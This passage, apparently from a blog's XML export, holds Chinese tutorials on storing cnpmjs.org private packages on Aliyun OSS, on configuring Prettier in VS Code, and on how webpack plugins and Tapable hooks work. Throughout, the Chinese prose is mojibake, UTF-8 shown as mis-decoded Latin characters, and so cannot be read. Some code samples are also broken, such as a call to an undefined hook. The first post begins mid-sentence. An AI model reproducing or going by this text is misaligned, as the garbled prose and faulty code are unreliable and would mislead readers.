è¿˜æœ‰å¥½å¤šå¼ºå¤§çš„åŠŸèƒ½ï¼Œè¿™é‡Œå°±ä¸ä¸€ä¸€ä»‹ç»äº†ï¼Œæœ‰å…´è¶£çš„æˆ³è¿™é‡Œã€‚ ç§æœ‰åŒ…å­˜å‚¨ä¸Šäº‘cnpmjs.org é¡¹ç›®é…ç½®é¡¹é‡Œé¢æœ‰ä¸€ä¸ª nfsé…ç½®ï¼Œè¿™é‡Œå®šä¹‰äº†ä¸€ä¸ª npm æ–‡ä»¶ç³»ç»Ÿï¼ˆNFSï¼‰ã€‚ç§æœ‰ä»“åº“åœ¨åŒæ­¥å’Œä¸Šä¼ çš„æ—¶å€™ï¼Œä¼šäº¤ç»™ NFS å¯¹è±¡ç›¸åº”çš„å‡½æ•°å»å¤„ç†ï¼ŒNFS å¯¹è±¡è¿”å›å¤„ç†ç»“æŸä¹‹åå†è¿”å›ä¸‹è½½é“¾æ¥ï¼Œæ‰€ä»¥é€šè¿‡è‡ªå®šä¹‰ NFS æ¨¡å—å¯ä»¥å®ç° npm åŒ…çš„å„ç§å®šåˆ¶å­˜å‚¨ã€‚ç›®å‰å®˜æ–¹é»˜è®¤ä½¿ç”¨fs-cnpmï¼Œè¯¥æ¨¡å—ä¼šå°†ä¸Šä¼ æˆ–è€…åŒæ­¥çš„åŒ…ä¿å­˜åœ¨æœåŠ¡å™¨æœ¬åœ°çš„/root/.cnpmjs.org/doenloads/ç›®å½•ä¸‹ã€‚è¿™ç§æ–¹å¼æ¯”è¾ƒä¼ ç»Ÿï¼Œä¸€æ–¹é¢éšç€ç§æœ‰åŒ…æ•°é‡çš„ä¸æ–­å¢åŠ ï¼Œå­˜å‚¨èµ„æºä¼šæ˜¯ä¸€ä¸ªç“¶é¢ˆã€‚å¦ä¸€æ–¹é¢éœ€è¦å®šæ—¶çš„å¤‡ä»½èµ„æºï¼Œä¸ç„¶å“ªå¤©ç£ç›˜åäº†ï¼Œé‚£å°±åªæœ‰ è¿™ä¸ªæ—¶å€™å°†ç§æœ‰åŒ…æˆ–è€…åŒæ­¥çš„èµ„æºæ”¾åˆ°äº‘ä¸Šå°±æ˜¯ä¸€ä¸ªéå¸¸å¥½çš„æ–¹æ¡ˆã€‚cnpmjs.org å®˜æ–¹æ—©å°±ä¸ºæˆ‘ä»¬æƒ³åˆ°äº†è¿™ç‚¹ï¼Œç»™å‡ºäº†ä¸‹é¢å‡ ç§ NFS æ¨¡å—ï¼š upyun-cnpmï¼šåˆæ‹äº‘å­˜å‚¨æ’ä»¶ fs-cnpmï¼šæœ¬åœ°å­˜å‚¨çš„æ’ä»¶ sfs-clientï¼š SFSï¼ˆSimple FIle Storeï¼‰å­˜å‚¨æ’ä»¶ qn-cnpmï¼šä¸ƒç‰›äº‘å­˜å‚¨æ’ä»¶ oss-cnpmï¼šé˜¿é‡Œäº‘ OSS å­˜å‚¨æ’ä»¶ è¿™äº›æ¨¡å—å·²ç»èƒ½å¤Ÿæ»¡è¶³æˆ‘ä»¬ç»å¤§éƒ¨åˆ†çš„åœºæ™¯ï¼Œå¦‚æœä½ æœ‰ç‰¹æ®Šçš„éœ€æ±‚ï¼Œå¯ä»¥å‚çœ‹nfsæ¨¡å—è§„èŒƒè¿›è¡Œå®šåˆ¶åŒ–å¼€å‘ã€‚è¿™é‡Œæ‹¿é˜¿é‡Œäº‘ oss å­˜å‚¨ä½œä¸ºç¤ºä¾‹ã€‚ é¦–å…ˆåœ¨ cnpmjs.org é¡¹ç›®ç›®å½•ä¸‹å®‰è£…oss-cnpmæ¨¡å— 12cnpm i oss-cnpmå¤åˆ¶ä»£ç  ç„¶ååœ¨äº‘æœåŠ¡æ§åˆ¶å° oss ç®¡ç†ä¸­æ–°å¢äº†ä¸€ä¸ª bucket æ¥å­˜å‚¨ npm åŒ…ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ä¸Šä¼ è·¯å¾„åŒºåˆ†æ¥å¤ç”¨å…¶ä»– bucketï¼Œæ¯•ç«Ÿåœ¨å…¬å¸ä¸­ bucket èµ„æºä¸€èˆ¬è¿˜æ˜¯æ¯”è¾ƒç´§å¼ çš„ã€‚ç„¶åä¿®æ”¹é¡¹ç›®é…ç½®æ–‡ä»¶ï¼Œå°†é»˜è®¤çš„fs-cnpmæ¨¡å—æ›¿æ¢æˆoss-cnpmã€‚ 1234567891011121314var oss = require(&quot;oss-cnpm&quot;);var nfs = oss.create(&#123; accessKeyId: &apos;xxxx&apos;, accessKeySecret: &apos;xxx&apos;, endpoint: &apos;oss-cn-beijing.aliyuncs.com&apos;, bucket: &apos;catfly-xxx&apos;, mode: &apos;private&apos;,&#125;)var config = &#123; ..., nfs:nfs, ...&#125;å¤åˆ¶ä»£ç  é‡å¯é¡¹ç›®ï¼Œè¿™ä¸ªæ—¶å€™å†å‘å¸ƒæˆ–è€…åŒæ­¥èµ„æºçš„æ—¶å€™ï¼ŒæœåŠ¡å™¨æœ¬åœ°ç›®å½•ä¸ä¼šæœ‰æ–°å‘å¸ƒæˆ–åŒæ­¥çš„åŒ…äº†ï¼Œåœ¨ oss å¯¹åº”çš„ bucket é‡Œé¢èƒ½æ‰¾åˆ°åˆšåˆšå‘å¸ƒæˆ–è€…åŒæ­¥çš„èµ„æºã€‚ å¸Œæœ›è¿™ç¯‡æ–‡ç« å¯¹ä½ æœ‰æ‰€å¸®åŠ©ã€‚ å‚è€ƒæ–‡çŒ®pm2ä½¿ç”¨ä»‹ç» éƒ¨ç½²å’Œå®šåˆ¶ CNPMâ€”â€”è‡ªå®šä¹‰åŒ…å­˜å‚¨å±‚]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Prettier+VScode æ²»å¥½ä½ çš„ä»£ç æ´ç™–]]></title>
    <url>%2F2020%2F06%2F12%2F%E5%85%B6%E4%BB%96%2FPrettier%2BVScode%20%E6%B2%BB%E5%A5%BD%E4%BD%A0%E7%9A%84%E4%BB%A3%E7%A0%81%E6%B4%81%E7%99%96%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªç½‘ç»œï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://segmentfault.com/a/1190000016579279 è¯•æƒ³ä¸€ä¸ªå¤šäººå¼€å‘çš„é¡¹ç›®ï¼Œæ¯æ¬¡åŒæ­¥ä»£ç ï¼Œçœ‹åˆ°å„ä¸ªé£æ ¼è¿¥å¼‚ï¼Œæ¢è¡Œç©ºæ ¼æ··ä¹±ï¼Œ4æ ¼ï¼Œ2æ ¼ç¼©è¿›äº¤æ›¿ä¸Šæ¼”çš„ä»£ç æ–‡ä»¶ï¼Œåˆ†åˆ†é’Ÿé€¼æ­»å¼ºè¿«ç—‡å•Šã€‚å¿æ— å¯å¿åªèƒ½æ‹”æªç›¸è§äº†~~ã€‚ç»Ÿä¸€çš„ä»£ç é£æ ¼è§„èŒƒï¼Œå¯¹äºå¤šäººå¼€å‘çš„å¤§é¡¹ç›®ä¸€å®šæ˜¯å¿…ä¸å¯å°‘çš„ï¼Œä½†æ˜¯å£å¤´çº¦å®šåˆæ˜¯ä¸€å®šæ²¡æœ‰ç”¨çš„ï¼ˆniceè„¸ï¼‰ã€‚è¿™æ—¶å€™å°±éœ€è¦Prettierä¸Šåœºäº†ï¼Œä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œé…åˆVScodeï¼Œä¿å­˜å³æ ¼å¼åŒ–ï¼Œä½ çš„åŒäº‹éƒ½ä¸éœ€è¦çŸ¥é“ä»£ç é£æ ¼æ˜¯ä»€ä¹ˆï¼Œæ•´ä¸ªå›¢é˜Ÿåªè¦cloneé¡¹ç›®ï¼Œè‡ªåŠ¨ä¿æŒç»Ÿä¸€é£æ ¼ã€‚æå®šï¼ Prettieræ˜¯ä»€ä¹ˆ Prettier is an opinionated code formatter. It enforces a consistent style by parsing your code and re-printing it with its own rules that take the maximum line length into account, wrapping code when necessary. ä»¥ä¸Šæ˜¯githubä¸Šçš„å®˜æ–¹è§£é‡Šï¼Œå…¶å®å°±æ˜¯ç®€å•çš„ä»£ç æ ¼å¼å·¥å…·ï¼Œå’ŒesLintä¸åŒåœ¨äºï¼ŒESLintåªæ˜¯ä¸€ä¸ªä»£ç è´¨é‡å·¥å…·(ç¡®ä¿æ²¡æœ‰æœªä½¿ç”¨çš„å˜é‡ã€æ²¡æœ‰å…¨å±€å˜é‡ï¼Œç­‰ç­‰)ã€‚è€ŒPrettieråªå…³å¿ƒæ ¼å¼åŒ–æ–‡ä»¶(æœ€å¤§é•¿åº¦ã€æ··åˆæ ‡ç­¾å’Œç©ºæ ¼ã€å¼•ç”¨æ ·å¼ç­‰)ã€‚å¯è§ï¼Œä»£ç æ ¼å¼ç»Ÿä¸€çš„é—®é¢˜ï¼Œäº¤ç»™Prettirerå†åˆé€‚ä¸è¿‡äº†ã€‚å’ŒEslinté…åˆä½¿ç”¨ï¼Œé£å‘³æ›´ä½³ã€‚ Prettieræ€ä¹ˆç”¨ ç¼–è¾‘å™¨æ’ä»¶ CLIå‘½ä»¤è¡Œ ç¼–è¾‘å™¨è¿™é‡Œä»‹ç»VSCodeä¸­å¦‚ä½•é…ç½®Prettier å®‰è£… Prettieræ’ä»¶ Prettier - Code formatterå®‰è£…æ’ä»¶åï¼Œè°ƒå‡ºç³»ç»Ÿè®¾ç½®å°±èƒ½çœ‹åˆ°prettierç›¸å…³é€‰é¡¹äº†ï¼Œå¦‚å›¾ æ·»åŠ è‡ªå®šä¹‰é…ç½®æ–‡ä»¶.prettierrcä½œä¸ºé¡¹ç›®çš„æ•´ä½“ä»£ç è§„èŒƒï¼Œå¦‚æœä¾èµ–æœ¬åœ°é…ç½®ï¼Œæ˜¾ç„¶æ˜¯ä¸ç§‘å­¦çš„ï¼Œæ‰€ä»¥éœ€è¦.prettierrc æ–‡ä»¶è¦†ç›–æœ¬åœ°é…ç½®ã€‚æˆ‘çš„é…ç½®æ–‡ä»¶å¦‚ä¸‹ 1234567891011&#123; &quot;singleQuote&quot;: true, &quot;trailingComma&quot;: &quot;es5&quot;, &quot;printWidth&quot;: 140, &quot;overrides&quot;: [ &#123; &quot;files&quot;: &quot;.prettierrc&quot;, &quot;options&quot;: &#123; &quot;parser&quot;: &quot;json&quot; &#125; &#125; ] &#125; åˆ°æ­¤ï¼Œprettierå®‰è£…å®Œæ¯•ï¼Œä½¿ç”¨shift+alt+få°±å¯æ ¼å¼åŒ–ä»£ç ã€‚å½“ç„¶æ¯æ¬¡æ‰‹åŠ¨æ ¼å¼åŒ–è¿˜æ˜¯å¾ˆè´¹åŠ›å•Šï¼Œæ€ä¹ˆåŠï¼Ÿè‡ªåŠ¨ä¿å­˜ã€‚ç³»ç»Ÿè®¾ç½®ä¸­å¢åŠ &quot;editor.formatOnSave&quot;: trueå³å¯è‡ªåŠ¨ä¿å­˜ï¼Œè¿˜è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œå¦‚æœåŒæ—¶è®¾ç½®äº†&quot;files.autoSave&quot;: &quot;autoSaveDelay&quot;,ä¿å­˜åŠæ ¼å¼åŒ–ä¼šå¤±æ•ˆã€‚files.autoSaveé…ç½®æˆåˆ«çš„é€‰é¡¹å³å¯ã€‚ å¦å¤–ï¼Œå¦‚æœé¡¹ç›®é…ç½®äº†.editorConfigæ–‡ä»¶ï¼Œåœ¨é…ç½®äº†&quot;editor.formatOnSave&quot;: trueåï¼Œå¦‚æœé¡¹ç›®æˆå‘˜æ²¡æœ‰å®‰è£… Prettier æ’ä»¶ï¼Œä¿å­˜æ—¶å°±ä¼šè¯»å–.editorConfigæ–‡ä»¶ï¼ŒåŒæ ·å¯ä»¥æ ¼å¼åŒ–ä»£ç ã€‚å¯ç”¨ Prettier æ’ä»¶åï¼Œ.editorConfigçš„é…ç½®å°±ä¼šå¤±æ•ˆï¼Œè¯»å–.prettierrc æ–‡ä»¶çš„é…ç½® å‘½ä»¤è¡Œå‘½ä»¤è¡Œç”¨æ³•éœ€è¦å®‰è£…prettier,npm install prettier --save-devï¼Œä½¿ç”¨prettier write **.js å°±å¯ä»¥æ ¼å¼åŒ–æ–‡ä»¶ã€‚å°†æ·»åŠ åˆ°ä½ çš„NPMè„šæœ¬ä¸­ï¼Œprettier --write &#39;./src/**/*.js,è¿™æ ·å°±å¯ä»¥æ‰¹é‡æ ¼å¼åŒ–é¡¹ç›®ä¸­çš„æ‰€æœ‰æ–‡ä»¶äº†ã€‚]]></content>
      <categories>
        <category>å…¶ä»–</category>
      </categories>
      <tags>
        <tag>å·¥å…·</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ­ç§˜webpackæ’ä»¶å·¥ä½œæµç¨‹å’ŒåŸç†]]></title>
    <url>%2F2020%2F06%2F05%2FWeb%E5%89%8D%E7%AB%AF%2F%E6%8F%AD%E7%A7%98webpack%E6%8F%92%E4%BB%B6%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B%E5%92%8C%E5%8E%9F%E7%90%86%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªçŸ¥ä¹ï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://zhuanlan.zhihu.com/p/141447713 é€šè¿‡æ’ä»¶æˆ‘ä»¬å¯ä»¥æ‰©å±•webpackï¼Œåœ¨åˆé€‚çš„æ—¶æœºé€šè¿‡Webpackæä¾›çš„ API æ”¹å˜è¾“å‡ºç»“æœï¼Œä½¿webpackå¯ä»¥æ‰§è¡Œæ›´å¹¿æ³›çš„ä»»åŠ¡ï¼Œæ‹¥æœ‰æ›´å¼ºçš„æ„å»ºèƒ½åŠ›ã€‚ æœ¬æ–‡å°†å°è¯•æ¢ç´¢ webpack æ’ä»¶çš„å·¥ä½œæµç¨‹ï¼Œè¿›è€Œå»æ­ç§˜å®ƒçš„å·¥ä½œåŸç†ã€‚åŒæ—¶éœ€è¦ä½ å¯¹webpackåº•å±‚å’Œæ„å»ºæµç¨‹çš„ä¸€äº›ä¸œè¥¿æœ‰ä¸€å®šçš„äº†è§£ã€‚ æƒ³è¦äº†è§£ webpack çš„æ’ä»¶çš„æœºåˆ¶ï¼Œéœ€è¦å¼„æ˜ç™½ä»¥ä¸‹å‡ ä¸ªçŸ¥è¯†ç‚¹ï¼š 1. ä¸€ä¸ªç®€å•çš„æ’ä»¶çš„æ„æˆ 2. webpackæ„å»ºæµç¨‹ 3. Tapableæ˜¯å¦‚ä½•æŠŠå„ä¸ªæ’ä»¶ä¸²è”åˆ°ä¸€èµ·çš„ 4. compilerä»¥åŠcompilationå¯¹è±¡çš„ä½¿ç”¨ä»¥åŠå®ƒä»¬å¯¹åº”çš„äº‹ä»¶é’©å­ã€‚ æ’ä»¶åŸºæœ¬ç»“æ„pluginsæ˜¯å¯ä»¥ç”¨è‡ªèº«åŸå‹æ–¹æ³•applyæ¥å®ä¾‹åŒ–çš„å¯¹è±¡ã€‚applyåªåœ¨å®‰è£…æ’ä»¶è¢«Webpack compileræ‰§è¡Œä¸€æ¬¡ã€‚applyæ–¹æ³•ä¼ å…¥ä¸€ä¸ªwebpck compilerçš„å¼•ç”¨ï¼Œæ¥è®¿é—®ç¼–è¯‘å™¨å›è°ƒã€‚ ä¸€ä¸ªç®€å•çš„æ’ä»¶ç»“æ„ï¼š123456789101112131415161718192021class HelloPlugin&#123; // åœ¨æ„é€ å‡½æ•°ä¸­è·å–ç”¨æˆ·ç»™è¯¥æ’ä»¶ä¼ å…¥çš„é…ç½® constructor(options)&#123; &#125; // Webpack ä¼šè°ƒç”¨ HelloPlugin å®ä¾‹çš„ apply æ–¹æ³•ç»™æ’ä»¶å®ä¾‹ä¼ å…¥ compiler å¯¹è±¡ apply(compiler) &#123; // åœ¨emité˜¶æ®µæ’å…¥é’©å­å‡½æ•°ï¼Œç”¨äºç‰¹å®šæ—¶æœºå¤„ç†é¢å¤–çš„é€»è¾‘ï¼› compiler.hooks.emit.tap('HelloPlugin', (compilation) =&gt; &#123; // åœ¨åŠŸèƒ½æµç¨‹å®Œæˆåå¯ä»¥è°ƒç”¨ webpack æä¾›çš„å›è°ƒå‡½æ•°ï¼› &#125;); // å¦‚æœäº‹ä»¶æ˜¯å¼‚æ­¥çš„ï¼Œä¼šå¸¦ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºå›è°ƒå‡½æ•°ï¼Œåœ¨æ’ä»¶å¤„ç†å®Œä»»åŠ¡æ—¶éœ€è¦è°ƒç”¨å›è°ƒå‡½æ•°é€šçŸ¥webpackï¼Œæ‰ä¼šè¿›å…¥ä¸‹ä¸€ä¸ªå¤„ç†æµç¨‹ã€‚ compiler.plugin('emit',function(compilation, callback) &#123; // æ”¯æŒå¤„ç†é€»è¾‘ // å¤„ç†å®Œæ¯•åæ‰§è¡Œ callback ä»¥é€šçŸ¥ Webpack // å¦‚æœä¸æ‰§è¡Œ callbackï¼Œè¿è¡Œæµç¨‹å°†ä¼šä¸€ç›´å¡åœ¨è¿™ä¸å¾€ä¸‹æ‰§è¡Œ callback(); &#125;); &#125;&#125;module.exports = HelloPlugin; å®‰è£…æ’ä»¶æ—¶, åªéœ€è¦å°†å®ƒçš„ä¸€ä¸ªå®ä¾‹æ”¾åˆ°Webpack config plugins æ•°ç»„é‡Œé¢: 123456const HelloPlugin = require('./hello-plugin.js');var webpackConfig = &#123; plugins: [ new HelloPlugin(&#123;options: true&#125;) ]&#125;; å…ˆæ¥åˆ†æä¸€ä¸‹webpack Pluginçš„å·¥ä½œåŸç† è¯»å–é…ç½®çš„è¿‡ç¨‹ä¸­ä¼šå…ˆæ‰§è¡Œ new HelloPlugin(options) åˆå§‹åŒ–ä¸€ä¸ª HelloPlugin è·å¾—å…¶å®ä¾‹ã€‚ åˆå§‹åŒ– compiler å¯¹è±¡åè°ƒç”¨ HelloPlugin.apply(compiler) ç»™æ’ä»¶å®ä¾‹ä¼ å…¥ compiler å¯¹è±¡ã€‚ æ’ä»¶å®ä¾‹åœ¨è·å–åˆ° compiler å¯¹è±¡åï¼Œå°±å¯ä»¥é€šè¿‡compiler.plugin(äº‹ä»¶åç§°, å›è°ƒå‡½æ•°) ç›‘å¬åˆ° Webpack å¹¿æ’­å‡ºæ¥çš„äº‹ä»¶ã€‚ å¹¶ä¸”å¯ä»¥é€šè¿‡ compiler å¯¹è±¡å»æ“ä½œ Webpackã€‚ webapck æ„å»ºæµç¨‹åœ¨ç¼–å†™æ’ä»¶ä¹‹å‰ï¼Œè¿˜éœ€è¦äº†è§£ä¸€ä¸‹Webpackçš„æ„å»ºæµç¨‹ï¼Œä»¥ä¾¿åœ¨åˆé€‚çš„æ—¶æœºæ’å…¥åˆé€‚çš„æ’ä»¶é€»è¾‘ã€‚ Webpackçš„åŸºæœ¬æ„å»ºæµç¨‹å¦‚ä¸‹ï¼š 1. æ ¡éªŒé…ç½®æ–‡ä»¶ ï¼šè¯»å–å‘½ä»¤è¡Œä¼ å…¥æˆ–è€…webpack.config.jsæ–‡ä»¶ï¼Œåˆå§‹åŒ–æœ¬æ¬¡æ„å»ºçš„é…ç½®å‚æ•° 2. ç”ŸæˆCompilerå¯¹è±¡ï¼šæ‰§è¡Œé…ç½®æ–‡ä»¶ä¸­çš„æ’ä»¶å®ä¾‹åŒ–è¯­å¥new MyWebpackPlugin()ï¼Œä¸ºwebpackäº‹ä»¶æµæŒ‚ä¸Šè‡ªå®šä¹‰hooks 3. è¿›å…¥entryOptioné˜¶æ®µï¼šwebpackå¼€å§‹è¯»å–é…ç½®çš„Entriesï¼Œé€’å½’éå†æ‰€æœ‰çš„å…¥å£æ–‡ä»¶ 4. run/watchï¼šå¦‚æœè¿è¡Œåœ¨watchæ¨¡å¼åˆ™æ‰§è¡Œwatchæ–¹æ³•ï¼Œå¦åˆ™æ‰§è¡Œrunæ–¹æ³• 5. compilationï¼šåˆ›å»ºCompilationå¯¹è±¡å›è°ƒcompilationç›¸å…³é’©å­ï¼Œä¾æ¬¡è¿›å…¥æ¯ä¸€ä¸ªå…¥å£æ–‡ä»¶(entry)ï¼Œä½¿ç”¨loaderå¯¹æ–‡ä»¶è¿›è¡Œç¼–è¯‘ã€‚é€šè¿‡compilationæˆ‘å¯ä»¥å¯ä»¥è¯»å–åˆ°moduleçš„resourceï¼ˆèµ„æºè·¯å¾„ï¼‰ã€loadersï¼ˆä½¿ç”¨çš„loaderï¼‰ç­‰ä¿¡æ¯ã€‚å†å°†ç¼–è¯‘å¥½çš„æ–‡ä»¶å†…å®¹ä½¿ç”¨acornè§£æç”ŸæˆASTé™æ€è¯­æ³•æ ‘ã€‚ç„¶åé€’å½’ã€é‡å¤çš„æ‰§è¡Œè¿™ä¸ªè¿‡ç¨‹ï¼Œ æ‰€æœ‰æ¨¡å—å’Œå’Œä¾èµ–åˆ†æå®Œæˆåï¼Œæ‰§è¡Œ compilation çš„ seal æ–¹æ³•å¯¹æ¯ä¸ª chunk è¿›è¡Œæ•´ç†ã€ä¼˜åŒ–ã€å°è£…__webpack_require__æ¥æ¨¡æ‹Ÿæ¨¡å—åŒ–æ“ä½œ. 6. emitï¼šæ‰€æœ‰æ–‡ä»¶çš„ç¼–è¯‘åŠè½¬åŒ–éƒ½å·²ç»å®Œæˆï¼ŒåŒ…å«äº†æœ€ç»ˆè¾“å‡ºçš„èµ„æºï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¼ å…¥äº‹ä»¶å›è°ƒçš„compilation.assetsä¸Šæ‹¿åˆ°æ‰€éœ€æ•°æ®ï¼Œå…¶ä¸­åŒ…æ‹¬å³å°†è¾“å‡ºçš„èµ„æºã€ä»£ç å—Chunkç­‰ç­‰ä¿¡æ¯ã€‚ 123456789// ä¿®æ”¹æˆ–æ·»åŠ èµ„æºcompilation.assets['new-file.js'] = &#123; source() &#123; return 'var a=1'; &#125;, size() &#123; return this.source().length; &#125;&#125;; afterEmitï¼šæ–‡ä»¶å·²ç»å†™å…¥ç£ç›˜å®Œæˆ doneï¼šå®Œæˆç¼–è¯‘ å¥‰ä¸Šä¸€å¼ æ»´æ»´äº‘åšå®¢çš„ WebPack ç¼–è¯‘æµç¨‹å›¾,ä¸å–œæ¬¢çœ‹æ–‡å­—è®²è§£çš„å¯ä»¥çœ‹æµç¨‹å›¾ç†è§£è®°å¿† WebPack ç¼–è¯‘æµç¨‹å›¾ åŸå›¾å‡ºè‡ªï¼šhttps://blog.didiyun.com/index.php/2019/03/01/webpack/ çœ‹å®Œä¹‹åï¼Œå¦‚æœè¿˜æ˜¯çœ‹ä¸æ‡‚æˆ–è€…å¯¹ç¼•ä¸æ¸…webpackæ„å»ºæµç¨‹çš„è¯ï¼Œå»ºè®®é€šè¯»ä¸€ä¸‹å…¨æ–‡ï¼Œå†å›æ¥çœ‹è¿™æ®µè¯ï¼Œç›¸ä¿¡ä¸€å®šä¼šå¯¹webpackæ„å»ºæµç¨‹æœ‰å¾ˆæ›´åŠ æ·±åˆ»çš„ç†è§£ã€‚ ç†è§£äº‹ä»¶æµæœºåˆ¶ Tabablewebpackæœ¬è´¨ä¸Šæ˜¯ä¸€ç§äº‹ä»¶æµçš„æœºåˆ¶ï¼Œå®ƒçš„å·¥ä½œæµç¨‹å°±æ˜¯å°†å„ä¸ªæ’ä»¶ä¸²è”èµ·æ¥ï¼Œè€Œå®ç°è¿™ä¸€åˆ‡çš„æ ¸å¿ƒå°±æ˜¯Tapableã€‚ Webpack çš„ Tapable äº‹ä»¶æµæœºåˆ¶ä¿è¯äº†æ’ä»¶çš„æœ‰åºæ€§ï¼Œå°†å„ä¸ªæ’ä»¶ä¸²è”èµ·æ¥ï¼Œ Webpack åœ¨è¿è¡Œè¿‡ç¨‹ä¸­ä¼šå¹¿æ’­äº‹ä»¶ï¼Œæ’ä»¶åªéœ€è¦ç›‘å¬å®ƒæ‰€å…³å¿ƒçš„äº‹ä»¶ï¼Œå°±èƒ½åŠ å…¥åˆ°è¿™æ¡webapckæœºåˆ¶ä¸­ï¼Œå»æ”¹å˜webapckçš„è¿ä½œï¼Œä½¿å¾—æ•´ä¸ªç³»ç»Ÿæ‰©å±•æ€§è‰¯å¥½ã€‚ Tapableä¹Ÿæ˜¯ä¸€ä¸ªå°å‹çš„ libraryï¼Œæ˜¯Webpackçš„ä¸€ä¸ªæ ¸å¿ƒå·¥å…·ã€‚ç±»ä¼¼äºnodeä¸­çš„eventsåº“ï¼Œæ ¸å¿ƒåŸç†å°±æ˜¯ä¸€ä¸ªè®¢é˜…å‘å¸ƒæ¨¡å¼ã€‚ä½œç”¨æ˜¯æä¾›ç±»ä¼¼çš„æ’ä»¶æ¥å£ã€‚ webpackä¸­æœ€æ ¸å¿ƒçš„è´Ÿè´£ç¼–è¯‘çš„Compilerå’Œè´Ÿè´£åˆ›å»ºbundlesçš„Compilationéƒ½æ˜¯Tapableçš„å®ä¾‹ï¼Œå¯ä»¥ç›´æ¥åœ¨ Compiler å’Œ Compilation å¯¹è±¡ä¸Šå¹¿æ’­å’Œç›‘å¬äº‹ä»¶ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š 1234567891011/*** å¹¿æ’­äº‹ä»¶* event-name ä¸ºäº‹ä»¶åç§°ï¼Œæ³¨æ„ä¸è¦å’Œç°æœ‰çš„äº‹ä»¶é‡å*/compiler.apply('event-name',params);compilation.apply('event-name',params);/*** ç›‘å¬äº‹ä»¶*/compiler.plugin('event-name',function(params)&#123;&#125;);compilation.plugin('event-name', function(params)&#123;&#125;); Tapableç±»æš´éœ²äº†tapã€tapAsyncå’ŒtapPromiseæ–¹æ³•ï¼Œå¯ä»¥æ ¹æ®é’©å­çš„åŒæ­¥/å¼‚æ­¥æ–¹å¼æ¥é€‰æ‹©ä¸€ä¸ªå‡½æ•°æ³¨å…¥é€»è¾‘ã€‚ tap åŒæ­¥é’©å­ 123compiler.hooks.compile.tap('MyPlugin', params =&gt; &#123; console.log('ä»¥åŒæ­¥æ–¹å¼è§¦åŠ compile é’©å­ã€‚')&#125;) tapAsync å¼‚æ­¥é’©å­ï¼Œé€šè¿‡callbackå›è°ƒå‘Šè¯‰Webpackå¼‚æ­¥æ‰§è¡Œå®Œæ¯• tapPromise å¼‚æ­¥é’©å­ï¼Œè¿”å›ä¸€ä¸ªPromiseå‘Šè¯‰Webpackå¼‚æ­¥æ‰§è¡Œå®Œæ¯• 12345678910compiler.hooks.run.tapAsync('MyPlugin', (compiler, callback) =&gt; &#123; console.log('ä»¥å¼‚æ­¥æ–¹å¼è§¦åŠ run é’©å­ã€‚') callback()&#125;)compiler.hooks.run.tapPromise('MyPlugin', compiler =&gt; &#123; return new Promise(resolve =&gt; setTimeout(resolve, 1000)).then(() =&gt; &#123; console.log('ä»¥å…·æœ‰å»¶è¿Ÿçš„å¼‚æ­¥æ–¹å¼è§¦åŠ run é’©å­') &#125;)&#125;) Tabableç”¨æ³•1234567891011const &#123; SyncHook, SyncBailHook, SyncWaterfallHook, SyncLoopHook, AsyncParallelHook, AsyncParallelBailHook, AsyncSeriesHook, AsyncSeriesBailHook, AsyncSeriesWaterfallHook &#125; = require("tapable"); ç®€å•å®ç°ä¸€ä¸ª SyncHook123456789101112131415161718192021class Hook&#123; constructor(args)&#123; this.taps = [] this.interceptors = [] // è¿™ä¸ªæ”¾åœ¨åé¢ç”¨ this._args = args &#125; tap(name,fn)&#123; this.taps.push(&#123;name,fn&#125;) &#125;&#125;class SyncHook extends Hook&#123; call(name,fn)&#123; try &#123; this.taps.forEach(tap =&gt; tap.fn(name)) fn(null,name) &#125; catch (error) &#123; fn(error) &#125; &#125;&#125; tapableæ˜¯å¦‚ä½•å°†webapck/webpackæ’ä»¶å…³è”çš„ï¼ŸCompiler.js 123456789101112131415161718192021const &#123; AsyncSeriesHook ,SyncHook &#125; = require("tapable");//åˆ›å»ºç±»class Compiler &#123; constructor() &#123; this.hooks = &#123; run: new AsyncSeriesHook(["compiler"]), //å¼‚æ­¥é’©å­ compile: new SyncHook(["params"]),//åŒæ­¥é’©å­ &#125;; &#125;, run()&#123; //æ‰§è¡Œå¼‚æ­¥é’©å­ this.hooks.run.callAsync(this, err =&gt; &#123; this.compile(onCompiled); &#125;); &#125;, compile()&#123; //æ‰§è¡ŒåŒæ­¥é’©å­ å¹¶ä¼ å‚ this.hooks.compile.call(params); &#125;&#125;module.exports = Compiler MyPlugin.js 1234567891011121314151617181920212223const Compiler = require('./Compiler')class MyPlugin&#123; apply(compiler)&#123;//æ¥å— compilerå‚æ•° compiler.hooks.run.tap("MyPlugin", () =&gt; console.log('å¼€å§‹ç¼–è¯‘...')); compiler.hooks.kzAsyncHook.tapAsync('MyPlugin', (name, age) =&gt; &#123; setTimeout(() =&gt; &#123; console.log('ç¼–è¯‘ä¸­...') &#125;, 1000) &#125;); &#125;&#125;//è¿™é‡Œç±»ä¼¼äºwebpack.config.jsçš„pluginsé…ç½®//å‘ plugins å±æ€§ä¼ å…¥ new å®ä¾‹const myPlugin = new MyPlugin();const options = &#123; plugins: [myPlugin]&#125;let compiler = new Compiler(options)compiler.run() æƒ³è¦æ·±å…¥äº†è§£tapableçš„æ–‡ç« å¯ä»¥çœ‹çœ‹è¿™ç¯‡æ–‡ç« ï¼š webpack4æ ¸å¿ƒæ¨¡å—tapableæºç è§£æ: https://www.cnblogs.com/tugenhua0707/p/11317557.html ç†è§£Compilerï¼ˆè´Ÿè´£ç¼–è¯‘ï¼‰å¼€å‘æ’ä»¶é¦–å…ˆè¦çŸ¥é“compilerå’Œ compilation å¯¹è±¡æ˜¯åšä»€ä¹ˆçš„ Compiler 